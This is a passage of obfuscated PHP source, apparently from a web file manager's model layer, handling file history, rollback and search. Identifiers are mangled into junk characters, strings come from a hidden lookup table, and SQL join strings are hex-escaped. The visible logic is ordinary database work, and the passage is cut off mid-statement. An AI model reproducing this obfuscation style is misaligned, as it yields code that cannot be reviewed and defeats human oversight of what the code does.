protected function _listAppendUser(&$èÚ¯³Ë) { $º¸ÂúËÜ =& $_SERVER[Î·Ü›öğ]; $¼Î­¨»¹ = array_to_keyvalue($èÚ¯³Ë, $º¸ÂúËÜ[12], $º¸ÂúËÜ[1810]); $ìÙÀ¹Ì = Model($º¸ÂúËÜ[610])->userListInfo($¼Î­¨»¹); foreach ($èÚ¯³Ë as &$¯šı¨¦“) { $ŠŸºÃæ§ = $¯šı¨¦“[$º¸ÂúËÜ[1810]]; $¯šı¨¦“[$º¸ÂúËÜ[538]] = $ìÙÀ¹Ì[$ŠŸºÃæ§] ? $ìÙÀ¹Ì[$ŠŸºÃæ§] : !1; } unset($¯šı¨¦“); } public function fileInfo($±ÕäÓ½ˆ, $Óê¦‘ò = false) { $õ¤øÃ¥ =& $_SERVER[Î·Ü›öğ]; $ãâ‹ğê÷ = $this->tablePrefix; $½Ù™ÄÀ = "{$ãâ‹ğê÷}\151\157\x5f\x66\x69\154\x65\40\x66\151\154\145\163\40\157\156\40\x66\x69\154\x65\163\x2e\x66\x69\154\145\x49\x44\40\x3d\40\x68\x69\x73\164\157\x72\171\56\146\151\154\x65\111\104"; $Å˜Ó¤Öğ = $this->alias($õ¤øÃ¥[2282])->where(array($õ¤øÃ¥[504] => $±ÕäÓ½ˆ))->join($½Ù™ÄÀ, $õ¤øÃ¥[2283])->find(); if ($Å˜Ó¤Öğ && $Óê¦‘ò) { $ëÎÈùÏ = array($õ¤øÃ¥[194] => $Å˜Ó¤Öğ[$õ¤øÃ¥[194]], $õ¤øÃ¥[477] => array($õ¤øÃ¥[1112], $±ÕäÓ½ˆ)); $Å˜Ó¤Öğ[$õ¤øÃ¥[1695]] = $this->where($ëÎÈùÏ)->count(); } return $Å˜Ó¤Öğ; } public function removeItem($ì©êŒú) { $Ô…³ˆª =& $_SERVER[Î·Ü›öğ]; $§®”ĞÕ² = array($Ô…³ˆª[504] => $ì©êŒú); $–­èëâé = $this->where($§®”ĞÕ²)->find(); if ($–­èëâé) { $ûŸ‹ç° = $this->where($§®”ĞÕ²)->delete(); Model($Ô…³ˆª[557])->remove($–­èëâé[$Ô…³ˆª[554]]); return $ûŸ‹ç°; } return !1; } public function removeBySource($şÀ’î›ê) { $¥¿ëÆòÏ =& $_SERVER[Î·Ü›öğ]; if (!$şÀ’î›ê) { return !1; } if (!is_array($şÀ’î›ê)) { $şÀ’î›ê = array($şÀ’î›ê); } $şèÖ­¢û = array($¥¿ëÆòÏ[502] => array($¥¿ëÆòÏ[7], $şÀ’î›ê)); $´Ï³à•Ê = $this->field($¥¿ëÆòÏ[555])->where($şèÖ­¢û)->select(); if ($´Ï³à•Ê) { $this->where($şèÖ­¢û)->delete(); $Æèœ³¾è = array_to_keyvalue($´Ï³à•Ê, $¥¿ëÆòÏ[12], $¥¿ëÆòÏ[554]); Model($¥¿ëÆòÏ[557])->remove($Æèœ³¾è); } return !0; } public function setDetail($äûã’‰ş, $îåÃ°Õ—) { $ÓÃá÷Ö‹ =& $_SERVER[Î·Ü›öğ]; return $this->where(array($ÓÃá÷Ö‹[504] => $äûã’‰ş))->save(array($ÓÃá÷Ö‹[2273] => $îåÃ°Õ—)); } public function rollbackToItem($óÍÍªÀ¯, $ŞŸ÷à§) { $í·Ö¾ÚÁ =& $_SERVER[Î·Ü›öğ]; $‘îÊ…°é = Model($í·Ö¾ÚÁ[922])->sourceInfo($óÍÍªÀ¯); $this->addHistory($‘îÊ…°é, LNG($í·Ö¾ÚÁ[2284])); $µŸˆ…ÓŠ = $this->find($ŞŸ÷à§); $ºïß‘ïŠ = array($í·Ö¾ÚÁ[554] => $µŸˆ…ÓŠ[$í·Ö¾ÚÁ[554]], $í·Ö¾ÚÁ[79] => $µŸˆ…ÓŠ[$í·Ö¾ÚÁ[79]], $í·Ö¾ÚÁ[88] => time(), $í·Ö¾ÚÁ[540] => USER_ID); Model($í·Ö¾ÚÁ[922])->where(array($í·Ö¾ÚÁ[194] => $óÍÍªÀ¯))->save($ºïß‘ïŠ); return $this->where(array($í·Ö¾ÚÁ[504] => $ŞŸ÷à§))->delete(); } public function clearSame($©¢Ò‘‚£) { $Æ‹ğ³³ş =& $_SERVER[Î·Ü›öğ]; $Îà‹Ã£ = $this->listData($©¢Ò‘‚£); $¨¸öĞ‰È = array_to_keyvalue_group($Îà‹Ã£, $Æ‹ğ³³ş[554]); $“¼”ƒİ¦ = array(); $æõ›†¥ = array(); foreach ($¨¸öĞ‰È as $£ªØˆâü) { if (!$£ªØˆâü || count($£ªØˆâü) <= 1) { continue; } foreach ($£ªØˆâü as $Ò¾¹áÉ®) { $“¼”ƒİ¦[] = $Ò¾¹áÉ®[$Æ‹ğ³³ş[554]]; $æõ›†¥[] = $Ò¾¹áÉ®[$Æ‹ğ³³ş[477]]; } } if (!$æõ›†¥) { return; } $this->where(array($Æ‹ğ³³ş[477] => array($Æ‹ğ³³ş[7], $æõ›†¥)))->delete(); Model($Æ‹ğ³³ş[557])->remove($“¼”ƒİ¦); } public function userSpace() { $Êâ€™İÅ =& $_SERVER[Î·Ü›öğ]; $æÅĞ¯‡í = $this->tablePrefix; $‚üÁö•û = array($Êâ€™İÅ[1801] => USER_ID); $œ¡§Ë† = "{$æÅĞ¯‡í}\151\157\137\146\151\x6c\145\x20\x66\x69\x6c\x65\163\40\157\156\40\x66\x69\x6c\145\163\56\146\151\154\x65\111\104\x20\x3d\x20\150\151\163\x74\x6f\162\171\56\146\151\x6c\145\111\x44"; return $this->alias($Êâ€™İÅ[2282])->where($‚üÁö•û)->join($œ¡§Ë†, $Êâ€™İÅ[2283])->sum($Êâ€™İÅ[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Å¡¤ßªÖ) { $ÉÛºòƒø =& $_SERVER[Î·Ü›öğ]; $ÂÁ÷¡Ò = KodIO::fileTypeList(); $…»É€öÓ = $ÂÁ÷¡Ò[$Å¡¤ßªÖ]; if (!$…»É€öÓ) { return array(); } $†Û — = $…»É€öÓ[$ÉÛºòƒø[169]]; $¼ø‘€† = $ÉÛºòƒø[7]; if (!$…»É€öÓ[$ÉÛºòƒø[169]]) { $¹ôıÉƒÇ = array_to_keyvalue($ÂÁ÷¡Ò, $ÉÛºòƒø[12], $ÉÛºòƒø[169]); $†Û — = implode($ÉÛºòƒø[50], $¹ôıÉƒÇ); $¼ø‘€† = $ÉÛºòƒø[2285]; } $¢™æìĞ = explode($ÉÛºòƒø[50], trim($†Û —, $ÉÛºòƒø[50])); return array($¼ø‘€†, $¢™æìĞ); } public function listPathType($Ò”É„) { $çÖé•óÆ =& $_SERVER[Î·Ü›öğ]; $ßĞ‰ƒ = $this->fileTypeWhere($Ò”É„); if (!$ßĞ‰ƒ) { return array(); } $û™ó‰ï‚ = USER_ID; $å–µ§ = Model($çÖé•óÆ[610])->getInfo($û™ó‰ï‚); $ˆ¿Ü¸ÙË = array($çÖé•óÆ[664] => SourceModel::TYPE_USER, $çÖé•óÆ[597] => array($çÖé•óÆ[628], $çÖé•óÆ[606] . $å–µ§[$çÖé•óÆ[90]][$çÖé•óÆ[194]] . $çÖé•óÆ[629]), $çÖé•óÆ[665] => $û™ó‰ï‚, $çÖé•óÆ[662] => 0, $çÖé•óÆ[663] => $ßĞ‰ƒ); return $this->listSource($ˆ¿Ü¸ÙË); } public function listSearch($ “¦Õ, $¾÷¡œº = 300) { $©çÓ¡îÜ =& $_SERVER[Î·Ü›öğ]; if (isset($ “¦Õ[$©çÓ¡îÜ[2108]]) && $ “¦Õ[$©çÓ¡îÜ[2108]]) { $ “¦Õ[$©çÓ¡îÜ[2108]] = str_replace($©çÓ¡îÜ[462], $©çÓ¡îÜ[2286], trim($ “¦Õ[$©çÓ¡îÜ[2108]])); } $—Ööô¶ä = $this->_parseSearchWhere($ “¦Õ); if (!isset($—Ööô¶ä[$©çÓ¡îÜ[516]])) { $—Ööô¶ä[$©çÓ¡îÜ[516]] = 0; } $°·îÚˆ‚ = $©çÓ¡îÜ[2287]; $‡ëğÙÙ = $—Ööô¶ä; $÷ºÜšïÏ = $°·îÚˆ‚; $this->_listSearchBindPinyin($ “¦Õ, $—Ööô¶ä, $°·îÚˆ‚); $this->alias($©çÓ¡îÜ[530])->_makeOrder(); $—Ööô¶ä = $this->parseWhereLike($—Ööô¶ä); $ô—¯İòù = $this->distinct(!0)->field($°·îÚˆ‚)->where($—Ööô¶ä)->selectPage($¾÷¡œº); if ($GLOBALS[$©çÓ¡îÜ[6]][$©çÓ¡îÜ[459]][$©çÓ¡îÜ[460]] && Input::check($ “¦Õ[$©çÓ¡îÜ[2108]], $©çÓ¡îÜ[671]) && $ô—¯İòù[$©çÓ¡îÜ[444]][$©çÓ¡îÜ[430]] == 1 && $ô—¯İòù[$©çÓ¡îÜ[444]][$©çÓ¡îÜ[445]] == 0) { $ô—¯İòù = $this->distinct(!0)->field($°·îÚˆ‚)->where($‡ëğÙÙ)->limit(1000)->select(); $ô—¯İòù = array_page_split($ô—¯İòù, !1, $¾÷¡œº); } $this->_listSearchFileContent($ô—¯İòù, $ “¦Õ, $÷ºÜšïÏ, $‡ëğÙÙ); $this->_listSearchDesc($ô—¯İòù, $ “¦Õ, $÷ºÜšïÏ); $this->_listSearchTag($ô—¯İòù, $ “¦Õ, $÷ºÜšïÏ); $this->_listSearchGroupTag($ô—¯İòù, $ “¦Õ, $÷ºÜšïÏ); $this->_listDataApply($ô—¯İòù[$©çÓ¡îÜ[447]]); $this->_listMake($ô—¯İòù); return $ô—¯İòù; } private function _listSearchFileContent(&$ê½Ì„Œ , $ãÑâˆ‡, $¿ŸÏ¼§¶, $¯¨ì÷ëÂ) { $„ş ×ûÊ =& $_SERVER[Î·Ü›öğ]; if (!$ãÑâˆ‡[$„ş ×ûÊ[2108]] || $ê½Ì„Œ [$„ş ×ûÊ[444]][$„ş ×ûÊ[430]] > 1) { return; } if (!isset($¯¨ì÷ëÂ[$„ş ×ûÊ[32]]) || !is_array($ãÑâˆ‡[$„ş ×ûÊ[554]])) { return; } $¯¨ì÷ëÂ[$„ş ×ûÊ[554]] = array($„ş ×ûÊ[7], $ãÑâˆ‡[$„ş ×ûÊ[554]]); unset($¯¨ì÷ëÂ[$„ş ×ûÊ[32]]); unset($ãÑâˆ‡[$„ş ×ûÊ[554]]); $È÷óÊŸó = $this->field($¿ŸÏ¼§¶)->where($¯¨ì÷ëÂ)->limit($„ş ×ûÊ[2288])->select(); if (!$È÷óÊŸó || count($È÷óÊŸó) == 0) { return; } $ê½Ì„Œ [$„ş ×ûÊ[447]] = array_merge($È÷óÊŸó, $ê½Ì„Œ [$„ş ×ûÊ[447]]); $ê½Ì„Œ [$„ş ×ûÊ[444]][$„ş ×ûÊ[445]] += count($È÷óÊŸó); } private function _listSearchTag(&$€Ú§ªÃ¶, $ë³ëøüê, $Ç¥§®ª—) { $»·¤™Ã =& $_SERVER[Î·Ü›öğ]; if (empty($ë³ëøüê[$»·¤™Ã[1970]]) || !in_array($»·¤™Ã[2289], $ë³ëøüê[$»·¤™Ã[1970]])) { return; } if (!$ë³ëøüê[$»·¤™Ã[2108]] || $€Ú§ªÃ¶[$»·¤™Ã[444]][$»·¤™Ã[430]] > 1) { return; } $ŒˆÁß¾ = Model($»·¤™Ã[2290])->listData(); $¯²©óï = array(); $óÓê»öş = $ë³ëøüê[$»·¤™Ã[2108]]; foreach ($ŒˆÁß¾ as $Ÿı¬­ô¶) { $î‰‡¤‘× = $Ÿı¬­ô¶[$»·¤™Ã[32]]; $ÅÌ×¿è­ = str_replace($»·¤™Ã[53], $»·¤™Ã[12], Pinyin::get($î‰‡¤‘×)); if (stripos($î‰‡¤‘×, $óÓê»öş) !== !1 || stripos($ÅÌ×¿è­, $óÓê»öş) !== !1) { $¯²©óï[] = $Ÿı¬­ô¶[$»·¤™Ã[477]]; } } if (!$¯²©óï) { return; } $ÄŒ±Àéí = array($»·¤™Ã[511] => array($»·¤™Ã[7], $¯²©óï), $»·¤™Ã[1810] => USER_ID); $ê¬´ü¾¾ = Model($»·¤™Ã[513])->field($»·¤™Ã[87])->where($ÄŒ±Àéí)->select(); $ê¬´ü¾¾ = array_to_keyvalue($ê¬´ü¾¾, $»·¤™Ã[12], $»·¤™Ã[87]); $©®ë¦ƒÈ = array_unique($ê¬´ü¾¾); $this->_listSearchMerge($€Ú§ªÃ¶, $ë³ëøüê, $Ç¥§®ª—, $©®ë¦ƒÈ); } private function _listSearchDesc(&$Û‰ê¡ÊÀ, $íôÑşÍ, $ÆÄÊÄÀÏ) { $à×´±¾º =& $_SERVER[Î·Ü›öğ]; if (empty($íôÑşÍ[$à×´±¾º[1970]]) || !in_array($à×´±¾º[537], $íôÑşÍ[$à×´±¾º[1970]])) { return; } if (!$íôÑşÍ[$à×´±¾º[2108]] || $Û‰ê¡ÊÀ[$à×´±¾º[444]][$à×´±¾º[430]] > 1) { return; } $ë¸òÒƒª = array($à×´±¾º[97] => $à×´±¾º[537], $à×´±¾º[452] => array($à×´±¾º[461], $à×´±¾º[2110] . $íôÑşÍ[$à×´±¾º[2108]] . $à×´±¾º[2110])); $ˆŸÍ¥ïâ = !1; if ($ˆŸÍ¥ïâ) { $Û¥ÓŸá = $this->listSearchChildren($íôÑşÍ[$à×´±¾º[193]]); $Û¥ÓŸá = array_unique($Û¥ÓŸá); if (!$Û¥ÓŸá) { return; } $ë¸òÒƒª[$à×´±¾º[194]] = array($à×´±¾º[7], $Û¥ÓŸá); } $…®ÒÄÒ = Model($à×´±¾º[648])->field($à×´±¾º[194])->where($ë¸òÒƒª)->limit(5000)->select(); $î«ÍŒÓç = array_to_keyvalue($…®ÒÄÒ, $à×´±¾º[12], $à×´±¾º[194]); $this->_listSearchMerge($Û‰ê¡ÊÀ, $íôÑşÍ, $ÆÄÊÄÀÏ, $î«ÍŒÓç); } private function _listSearchGroupTag(&$§æ‹§Óğ, $ñàÚÌüù, $·æŞÓ´°) { $ıÚ‡â‹¼ =& $_SERVER[Î·Ü›öğ]; if (empty($ñàÚÌüù[$ıÚ‡â‹¼[1970]]) || !in_array($ıÚ‡â‹¼[2289], $ñàÚÌüù[$ıÚ‡â‹¼[1970]])) { return; } if (!$ñàÚÌüù[$ıÚ‡â‹¼[2108]] || $§æ‹§Óğ[$ıÚ‡â‹¼[444]][$ıÚ‡â‹¼[430]] > 1 || !$ñàÚÌüù[$ıÚ‡â‹¼[193]]) { return; } $¹ƒÌÔÜ„ = $this->sourceInfo($ñàÚÌüù[$ıÚ‡â‹¼[193]]); if (!$¹ƒÌÔÜ„ || $¹ƒÌÔÜ„[$ıÚ‡â‹¼[191]] != SourceModel::TYPE_GROUP) { return; } $£©³ÇßŞ = $¹ƒÌÔÜ„[$ıÚ‡â‹¼[582]]; $Ó¿‡¼­í = Model($ıÚ‡â‹¼[2291])->get($£©³ÇßŞ); $Ï´úÆÑ = array(); $ÓâÌ£– = $ñàÚÌüù[$ıÚ‡â‹¼[2108]]; foreach ($Ó¿‡¼­í[$ıÚ‡â‹¼[447]] as $’ŒÆ¨Î‹) { $¡š„Ê¡† = $’ŒÆ¨Î‹[$ıÚ‡â‹¼[32]]; $§§üâ¹ = str_replace($ıÚ‡â‹¼[53], $ıÚ‡â‹¼[12], Pinyin::get($¡š„Ê¡†)); if (stripos($¡š„Ê¡†, $ÓâÌ£–) !== !1 || stripos($§§üâ¹, $ÓâÌ£–) !== !1) { $Ï´úÆÑ[] = $’ŒÆ¨Î‹[$ıÚ‡â‹¼[477]]; } } if (!$Ï´úÆÑ) { return; } $û˜ƒª = array($ıÚ‡â‹¼[511] => array($ıÚ‡â‹¼[7], $Ï´úÆÑ), $ıÚ‡â‹¼[1810] => 0, $ıÚ‡â‹¼[33] => $ıÚ‡â‹¼[1416] . $£©³ÇßŞ); $—·É½¤ = Model($ıÚ‡â‹¼[513])->field($ıÚ‡â‹¼[87])->where($û˜ƒª)->select(); $—·É½¤ = array_to_keyvalue($—·É½¤, $ıÚ‡â‹¼[12], $ıÚ‡â‹¼[87]); $ùÑ´÷› = array_unique($—·É½¤); $this->_listSearchMerge($§æ‹§Óğ, $ñàÚÌüù, $·æŞÓ´°, $ùÑ´÷›); } private function _listSearchMerge(&$ò«”Ûºœ, $­ÏÀ†à, $„Í»ü‘é, $˜“Ãšç) { $›ªÚ‡Êİ =& $_SERVER[Î·Ü›öğ]; if (!$˜“Ãšç) { return; } $¹·¸Ü = array_to_keyvalue($ò«”Ûºœ[$›ªÚ‡Êİ[447]], $›ªÚ‡Êİ[12], $›ªÚ‡Êİ[194]); $µø«İŞ¤ = array_diff($˜“Ãšç, $¹·¸Ü); if (!$µø«İŞ¤) { return; } $ıÃÂì¤Â = array($›ªÚ‡Êİ[194] => array($›ªÚ‡Êİ[7], $µø«İŞ¤)); $ êéÂÁ = $this->field($„Í»ü‘é)->where($ıÃÂì¤Â)->select(); if (!$ êéÂÁ) { return; } $Ç³—¶à = array(); foreach ($ êéÂÁ as $ˆ£Å¬Ù») { if ($this->_listSearchFilter($ˆ£Å¬Ù», $­ÏÀ†à)) { $Ç³—¶à[] = $ˆ£Å¬Ù»; } } $ò«”Ûºœ[$›ªÚ‡Êİ[447]] = array_merge($Ç³—¶à, $ò«”Ûºœ[$›ªÚ‡Êİ[447]]); $ò«”Ûºœ[$›ªÚ‡Êİ[444]][$›ªÚ‡Êİ[445]] += count($Ç³—¶à); } private function _listSearchFilter($¨µ™å ä, $×¢àê£®) { $Óº”Å¨± =& $_SERVER[Î·Ü›öğ]; $Èüôş§š = $¨µ™å ä[$Óº”Å¨±[496]] == $Óº”Å¨±[91]; if (!strstr($¨µ™å ä[$Óº”Å¨±[597]], $Óº”Å¨±[50] . $×¢àê£®[$Óº”Å¨±[193]] . $Óº”Å¨±[50])) { return !1; } if (isset($×¢àê£®[$Óº”Å¨±[497]]) && $×¢àê£®[$Óº”Å¨±[497]] != $Óº”Å¨±[868]) { if ($×¢àê£®[$Óº”Å¨±[497]] == $Óº”Å¨±[78] && !$Èüôş§š) { return !1; } if ($×¢àê£®[$Óº”Å¨±[497]] != $Óº”Å¨±[78] && $Èüôş§š) { return !1; } if (!strstr($¨µ™å ä[$Óº”Å¨±[169]], $Óº”Å¨±[50] . $×¢àê£®[$Óº”Å¨±[497]] . $Óº”Å¨±[50])) { return !1; } } if (isset($×¢àê£®[$Óº”Å¨±[2292]]) && $×¢àê£®[$Óº”Å¨±[2292]] < $¨µ™å ä[$Óº”Å¨±[79]]) { return !1; } if (isset($×¢àê£®[$Óº”Å¨±[2293]]) && $×¢àê£®[$Óº”Å¨±[2293]] > $¨µ™å ä[$Óº”Å¨±[79]]) { return !1; } if (isset($×¢àê£®[$Óº”Å¨±[678]]) && $×¢àê£®[$Óº”Å¨±[678]] != $¨µ™å ä[$Óº”Å¨±[540]]) { return !1; } return !0; } public function listSearchChildren($šÜìˆã³, $¤õ—æÔü = 5000) { $Îı“ÉÏÇ =& $_SERVER[Î·Ü›öğ]; $ÒÛÂ†¼° = array(); $šÃ÷¾ü = $this->sourceInfo($šÜìˆã³); $½æ«à‘· = array($Îı“ÉÏÇ[597] => array($Îı“ÉÏÇ[461], $šÃ÷¾ü[$Îı“ÉÏÇ[597]] . $šÃ÷¾ü[$Îı“ÉÏÇ[194]] . $Îı“ÉÏÇ[629])); $¨¹¹ÕÖÙ = $this->field($Îı“ÉÏÇ[79])->where($½æ«à‘·)->limit($¤õ—æÔü + 1)->select(); $³Ÿê„‹ò = is_array($¨¹¹ÕÖÙ) ? count($¨¹¹ÕÖÙ) : 0; if ($³Ÿê„‹ò > $¤õ—æÔü) { return $this->_listSearchChildrenNear($šÜìˆã³, $¤õ—æÔü); } $½‡’í£š = $this->field($Îı“ÉÏÇ[194])->where($½æ«à‘·)->select(); $ÒÛÂ†¼° = array_to_keyvalue($½‡’í£š, $Îı“ÉÏÇ[12], $Îı“ÉÏÇ[194]); return $ÒÛÂ†¼°; } private function _listSearchChildrenNear($¶Ùá—¼å, $©ŠÓ£”—) { $Şƒ¹öÕ˜ =& $_SERVER[Î·Ü›öğ]; $ªÃíÎæØ = array(); $·À—ÑÙ = array($Şƒ¹öÕ˜[193] => $¶Ùá—¼å); $ı…ÌÌªÁ = $this->field($Şƒ¹öÕ˜[2294])->where($·À—ÑÙ)->select(); $ÊÖÙ¶Ÿ = array_to_keyvalue(array_filter_by_field($ı…ÌÌªÁ, $Şƒ¹öÕ˜[496], $Şƒ¹öÕ˜[91]), $Şƒ¹öÕ˜[12], $Şƒ¹öÕ˜[194]); $ªÃíÎæØ = array_merge($ªÃíÎæØ, array_to_keyvalue($ı…ÌÌªÁ, $Şƒ¹öÕ˜[12], $Şƒ¹öÕ˜[194])); if (!$ÊÖÙ¶Ÿ) { return $ªÃíÎæØ; } $·À—ÑÙ = array($Şƒ¹öÕ˜[193] => array($Şƒ¹öÕ˜[7], $ÊÖÙ¶Ÿ)); $ı…ÌÌªÁ = $this->field($Şƒ¹öÕ˜[2294])->where($·À—ÑÙ)->limit($©ŠÓ£”—)->select(); $ªÃíÎæØ = array_merge($ªÃíÎæØ, array_to_keyvalue($ı…ÌÌªÁ, $Şƒ¹öÕ˜[12], $Şƒ¹öÕ˜[194])); $ªÃíÎæØ = array_slice($ªÃíÎæØ, 0, intval($©ŠÓ£”—)); return $ªÃíÎæØ; } private function _listSearchBindPinyin($ˆìç”, &$„ôÓæì©, &$Æ—Ÿ«şÒ) { $‹ˆÁÙñ =& $_SERVER[Î·Ü›öğ]; if (!isset($ˆìç”[$‹ˆÁÙñ[2108]]) || !$ˆìç”[$‹ˆÁÙñ[2108]]) { return; } if (!Input::check($ˆìç”[$‹ˆÁÙñ[2108]], $‹ˆÁÙñ[395]) || strlen($ˆìç”[$‹ˆÁÙñ[2108]]) < 2) { return; } $ì˜Ù€ˆË = "\x4c\x45\106\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x69\x6f\137\x73\x6f\x75\162\143\145\137\155\x65\x74\x61\40\x6d\145\164\x61\x20\x6f\x6e\x20\163\x6f\165\x72\x63\145\x2e\x73\157\x75\162\x63\145\x49\x44\40\75\40\x6d\x65\164\141\56\163\x6f\165\x72\143\145\111\104"; $ŒÑû——› = array(); $Æ—Ÿ«şÒ = str_replace(array($‹ˆÁÙñ[288], $‹ˆÁÙñ[53], $‹ˆÁÙñ[2295]), $‹ˆÁÙñ[12], $Æ—Ÿ«şÒ); $Æ—Ÿ«şÒ = $‹ˆÁÙñ[522] . str_replace($‹ˆÁÙñ[50], $‹ˆÁÙñ[523], $Æ—Ÿ«şÒ); $É¿Ú´üÍ = $„ôÓæì©[$‹ˆÁÙñ[32]]; unset($„ôÓæì©[$‹ˆÁÙñ[32]]); foreach ($„ôÓæì© as $‡„ÅÊ£Á => $¾ï·Ì) { $ŒÑû——›[$‹ˆÁÙñ[522] . $‡„ÅÊ£Á] = $¾ï·Ì; } foreach ($É¿Ú´üÍ as $½µØà±) { $ŒÑû——›[] = array($‹ˆÁÙñ[527] => $½µØà±, $‹ˆÁÙñ[1099] => $‹ˆÁÙñ[2112], array($‹ˆÁÙñ[2296] => $½µØà±, $‹ˆÁÙñ[2297] => array($‹ˆÁÙñ[7], array($‹ˆÁÙñ[549], $‹ˆÁÙñ[548])))); } $this->join($ì˜Ù€ˆË); $„ôÓæì© = $ŒÑû——›; } private function _parseSearchWhere($Áş²’È) { $¸¹ıï©Ê =& $_SERVER[Î·Ü›öğ]; $Ï˜Ï¡Ğí = array(); if (isset($Áş²’È[$¸¹ıï©Ê[850]]) && $Áş²’È[$¸¹ıï©Ê[850]]) { $Ï˜Ï¡Ğí[$¸¹ıï©Ê[88]] = array($¸¹ıï©Ê[2298], $Áş²’È[$¸¹ıï©Ê[850]]); } if (isset($Áş²’È[$¸¹ıï©Ê[851]]) && $Áş²’È[$¸¹ıï©Ê[851]]) { $‘Æ™ôÊ = array($¸¹ıï©Ê[2299], $Áş²’È[$¸¹ıï©Ê[851]]); if ($Ï˜Ï¡Ğí[$¸¹ıï©Ê[88]]) { $Ï˜Ï¡Ğí[$¸¹ıï©Ê[88]] = array($Ï˜Ï¡Ğí[$¸¹ıï©Ê[88]], $‘Æ™ôÊ, $¸¹ıï©Ê[2300]); } else { $Ï˜Ï¡Ğí[$¸¹ıï©Ê[88]] = $‘Æ™ôÊ; } } if (isset($Áş²’È[$¸¹ıï©Ê[2292]]) && $Áş²’È[$¸¹ıï©Ê[2292]] > 0) { $Ï˜Ï¡Ğí[$¸¹ıï©Ê[79]] = array($¸¹ıï©Ê[2298], $Áş²’È[$¸¹ıï©Ê[2292]]); } if (isset($Áş²’È[$¸¹ıï©Ê[2293]]) && $Áş²’È[$¸¹ıï©Ê[2293]]) { $‘Æ™ôÊ = array($¸¹ıï©Ê[2299], $Áş²’È[$¸¹ıï©Ê[2293]]); if ($Ï˜Ï¡Ğí[$¸¹ıï©Ê[79]]) { $Ï˜Ï¡Ğí[$¸¹ıï©Ê[79]] = array($Ï˜Ï¡Ğí[$¸¹ıï©Ê[79]], $‘Æ™ôÊ, $¸¹ıï©Ê[2300]); } else { $Ï˜Ï¡Ğí[$¸¹ıï©Ê[79]] = $‘Æ™ôÊ; } } if (isset($Áş²’È[$¸¹ıï©Ê[678]]) && $Áş²’È[$¸¹ıï©Ê[678]]) { $Ï˜Ï¡Ğí[] = array($¸¹ıï©Ê[540] => $Áş²’È[$¸¹ıï©Ê[678]], $¸¹ıï©Ê[538] => $Áş²’È[$¸¹ıï©Ê[678]], $¸¹ıï©Ê[1099] => $¸¹ıï©Ê[2112]); } if (isset($Áş²’È[$¸¹ıï©Ê[497]]) && $Áş²’È[$¸¹ıï©Ê[497]]) { $ß¹÷èè = $Áş²’È[$¸¹ıï©Ê[497]]; if ($ß¹÷èè == $¸¹ıï©Ê[78]) { $Ï˜Ï¡Ğí[$¸¹ıï©Ê[496]] = 1; } else { if ($ß¹÷èè == $¸¹ıï©Ê[2301]) { $Ï˜Ï¡Ğí[$¸¹ıï©Ê[496]] = 0; } else { if ($ß¹÷èè) { $ß¹÷èè = is_array($ß¹÷èè) ? $ß¹÷èè : explode($¸¹ıï©Ê[50], $ß¹÷èè); $Ï˜Ï¡Ğí[$¸¹ıï©Ê[497]] = array($¸¹ıï©Ê[503], $ß¹÷èè); $Ï˜Ï¡Ğí[$¸¹ıï©Ê[496]] = 0; } } } } $this->_parseSearchParent($Áş²’È, $Ï˜Ï¡Ğí); if (isset($Áş²’È[$¸¹ıï©Ê[2108]]) && trim($Áş²’È[$¸¹ıï©Ê[2108]])) { $Ìõ¾ŠÖ‚ = trim($Áş²’È[$¸¹ıï©Ê[2108]]); $Ë ÂÜ¿å = explode($¸¹ıï©Ê[53], $Ìõ¾ŠÖ‚); if (strlen($Ìõ¾ŠÖ‚) > 2 && (substr($Ìõ¾ŠÖ‚, 0, 1) == $¸¹ıï©Ê[121] && substr($Ìõ¾ŠÖ‚, -1) == $¸¹ıï©Ê[121]) || substr($Ìõ¾ŠÖ‚, 0, 1) == $¸¹ıï©Ê[58] && substr($Ìõ¾ŠÖ‚, -1) == $¸¹ıï©Ê[58]) { $Ìõ¾ŠÖ‚ = substr($Ìõ¾ŠÖ‚, 1, -1); $Ë ÂÜ¿å = array($Ìõ¾ŠÖ‚); } $Ï˜Ï¡Ğí[$¸¹ıï©Ê[32]] = array(array($¸¹ıï©Ê[628], $¸¹ıï©Ê[2110] . $Ìõ¾ŠÖ‚ . $¸¹ıï©Ê[2110])); if (count($Ë ÂÜ¿å) > 1) { $Ï˜Ï¡Ğí[$¸¹ıï©Ê[32]] = array(); foreach ($Ë ÂÜ¿å as $ˆ©×Â¡ü) { if (!trim($ˆ©×Â¡ü)) { continue; } $Ï˜Ï¡Ğí[$¸¹ıï©Ê[32]][] = array($¸¹ıï©Ê[628], $¸¹ıï©Ê[2110] . trim($ˆ©×Â¡ü) . $¸¹ıï©Ê[2110]); } } } return $Ï˜Ï¡Ğí; } private function _parseSearchParent($ıÓÑ”ü‰, &$Ô¼Ç‰÷ß) { $ãñÂà«§ =& $_SERVER[Î·Ü›öğ]; if (!isset($ıÓÑ”ü‰[$ãñÂà«§[193]]) || !$ıÓÑ”ü‰[$ãñÂà«§[193]]) { return; } $œ¯©ŠÚê = $this->pathInfo($ıÓÑ”ü‰[$ãñÂà«§[193]]); $ºã‰ìÊ¡ = $œ¯©ŠÚê[$ãñÂà«§[193]] . $ãñÂà«§[12] === $ãñÂà«§[231]; $Äòõóıâ = $œ¯©ŠÚê[$ãñÂà«§[191]] == $ãñÂà«§[591]; if ($œ¯©ŠÚê[$ãñÂà«§[607]] == $ãñÂà«§[608]) { $ªƒø¾ë = $this->sourceInfo($ıÓÑ”ü‰[$ãñÂà«§[193]]); $œ¯©ŠÚê[$ãñÂà«§[597]] = $ªƒø¾ë[$ãñÂà«§[597]]; } $Ô¼Ç‰÷ß[$ãñÂà«§[668]] = array($ãñÂà«§[628], $œ¯©ŠÚê[$ãñÂà«§[597]] . $ıÓÑ”ü‰[$ãñÂà«§[193]] . $ãñÂà«§[629]); $‡µÓûë = isset($ıÓÑ”ü‰[$ãñÂà«§[1970]]) && in_array($ãñÂà«§[591], $ıÓÑ”ü‰[$ãñÂà«§[1970]]); if (!$‡µÓûë || !$Äòõóıâ || !$ºã‰ìÊ¡ || !$œ¯©ŠÚê[$ãñÂà«§[498]]) { return; } if (!AuthModel::authCheckRoot($œ¯©ŠÚê[$ãñÂà«§[498]][$ãñÂà«§[499]])) { return; } $Í±ñô×£ = $œ¯©ŠÚê[$ãñÂà«§[582]] . $ãñÂà«§[12]; if ($Í±ñô×£ == $ãñÂà«§[91]) { unset($Ô¼Ç‰÷ß[$ãñÂà«§[668]]); $Ô¼Ç‰÷ß[$ãñÂà«§[191]] = 